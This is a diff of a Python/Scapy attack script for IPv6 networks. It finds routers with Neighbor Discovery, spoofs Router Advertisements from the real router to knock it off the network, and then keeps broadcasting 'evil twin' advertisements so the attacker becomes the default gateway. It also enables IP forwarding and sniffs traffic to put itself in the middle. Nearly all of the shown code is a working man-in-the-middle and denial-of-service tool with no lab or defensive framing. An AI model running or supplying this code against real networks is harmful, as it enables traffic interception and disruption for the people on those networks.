@@ -10,13 +10,12 @@ from netifaces import AF_INET, AF_INET6, AF_LINK
 from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
 from scapy.all import *
 from scapy.all import sr1, IP, ICMP
-
 # Explanation:
 # This tools does a couple of cool things
 # Assume RA is not enabled on the target network this should work
 # First the script will query to find all routers on the network via NDP_RS(Router Solicitation)
 # Once routers are spotted we will kick them off by sending a spoofed NDP_RA(Router Advertisement)
-# With a router lifetime of 0 essintially making them unreachable and booting that router (well see if it works)
+# With a router lifetime of 0 essintially making them unreachable and booting that router (it actually works lol)
 # Now we can simulate a evil twin like attack and send Router advertisements of our own!
 # This script will put us in the middle!
 
@@ -24,12 +23,9 @@ from scapy.all import sr1, IP, ICMP
 def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
     '''
     This function sends a Neighbor Solicitation (NS) message to the specified IPv6 address.
-    base = IPv6(dst="ff02::2")
-    router_solicitation = ICMPv6ND_RS()
-    src_ll_address = ICMPv6NDOptSrcLLAddr(lladdr=mac_info[0]['addr'])
-    ether = Ether(src=mac_info[0]['addr'], dst='33:33:00:00:00:02')
-    packet = ether / base / router_solicitation / src_ll_address
+
     '''
+    router_mac = ''
     ether = Ether(src=attacker_mac, dst='33:33:00:00:00:02')
     base = IPv6(dst=router_ip[0], src=attacker_ipv6)
     ICMPv6NS = ICMPv6ND_NS(tgt=router_ip[0])
@@ -41,9 +37,70 @@ def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
     if answered:
         for sent_pkt, received_pkt in answered:
             print("\nFull details of the received packet:")
-            received_pkt.show()
-    else:
-        print("\nNo answers received.")
+            router_mac = received_pkt[Ether].src
+            router_ip = received_pkt[IPv6].src
+            return router_ip, router_mac
+
+
+def routerBooted(router_ip, router_mac, interface):
+    ether = Ether(src=router_mac, dst='33:33:00:00:00:02')
+    base = IPv6(src=router_ip, dst='ff02::1')
+    RA = ICMPv6ND_RA(O=1, routerlifetime=1)
+    ll_address = ICMPv6NDOptSrcLLAddr(lladdr=router_mac)
+    packet = ether / base / RA / ll_address
+    print(packet.show())
+    sendp(packet, iface=interface, verbose=0)
+    pass
+
+
+def sendEvilTwin(interface, attacker_ipv6, attacker_mac):
+    ether = Ether(src=attacker_mac, dst='33:33:00:00:00:02')
+    base = IPv6(dst='ff02::1', src=attacker_ipv6)
+    RA = ICMPv6ND_RA(routerlifetime=65535)
+    ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
+    packet = ether / base / RA / ll_address
+    print("Sending Evil Twin RA")
+    print(packet.show())
+    sendp(packet, iface=interface, verbose=0)
+
+    pass
+
+
+def packet_analyzer(packet):
+    # We want to intercept and extract:
+    dst_mac = ""
+    dst_ip = ""
+    src_mac = ""
+    src_ip = ""
+
+    if Ether in packet and IP in packet:
+        src_mac = packet[Ether].src
+        dst_mac = packet[Ether].dst
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+    for ipv, macv in hackedMachines:
+        if ipv == dst_ip:
+            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    '''
+	    	if src_mac == macv and dst_mac == attacker_mac: 
+	    		packet[Ether].dst = getMacAddress(src_ip)
+	    		packet[Ether].src = attacker_mac
+	    		sendp(packet)
+	    		break
+	    	if dst_mac == attacer_mac and ipv == dst_ip: 
+	    		packet[Ether].dst = macv
+	    		packet[Ether].src = attacker_mac
+	    		sendp(packet)
+	    		break
+	 '''
+
+    return None
+
+
+def startSniffer():
+    a = sniff(filter="ip", prn=packet_analyzer)
+    pass
 
 
 def filtered_ips(attacker_ipv6, output):
@@ -72,9 +129,28 @@ def main():
     routers = filtered_ips(attacker_ipv6, output)
     print("Routers found:")
     print(routers)
-    for router in routers:
-        print(f"Router IPv6: {router}")
-        sendNDP_NS(attacker_ipv6, attacker_mac, routers, interface)
+    router_ip, router_mac = sendNDP_NS(
+        attacker_ipv6, attacker_mac, routers, interface)
+    # We now know everything we need to know about the router
+    print("Router ip: ", router_ip)
+    print("Router mac: ", router_mac)
+    # send one thread to send the RA
+
+    def continuousBoot():
+        while True:
+            routerBooted(router_ip, router_mac, interface)
+            time.sleep(2)
+
+    spoof_thread = threading.Thread(target=continuousBoot)
+    spoof_thread.start()
+
+    def EvilTwinAttack():
+        while True:
+            sendEvilTwin(interface, attacker_ipv6, attacker_mac)
+            time.sleep(2)
+
+    sniffer_thread = threading.Thread(target=EvilTwinAttack)
+    sniffer_thread.start()
 
 
 main()
